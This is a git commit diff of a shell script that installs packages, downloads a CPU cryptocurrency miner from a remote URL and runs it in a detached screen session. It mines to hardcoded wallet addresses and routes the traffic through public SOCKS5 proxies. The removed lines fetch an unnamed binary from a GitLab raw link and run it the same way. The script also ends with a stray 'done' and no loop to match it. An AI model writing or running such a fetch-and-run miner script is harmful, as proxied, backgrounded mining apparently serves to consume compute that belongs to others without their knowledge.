232de933141820d5141cd88e613e4bdcecca6b00
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-19 10:42:59 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,11 +1,10 @@
 #!/bin/sh
 apt-get update 
 apt-get install screen libjansson4 -y
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/xolx
-chmod 777 xolx
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-sse2
 screen -dmS ls
-POOL=pool.hashvault.pro:80
-WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
-WORKER=$(echo $(shuf -i 111111-999999 -n 1)-GAS)
-PROXY=socks5://72.210.252.134:46164
-./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
+PROXY=socks5://72.221.164.34:60671
+./cpuminer-sse2 -a gr -o stratum+tcp://stratum-na.rplant.xyz:7056 -u RQKNmref6uHRhzyYmWGfx3uKTjpRPTRnHx.$(echo $(shuf -i 10000-99999 -n 1)-CPU) -t 2 -x $PROXY
+sleep 5
+done
+sleep 10
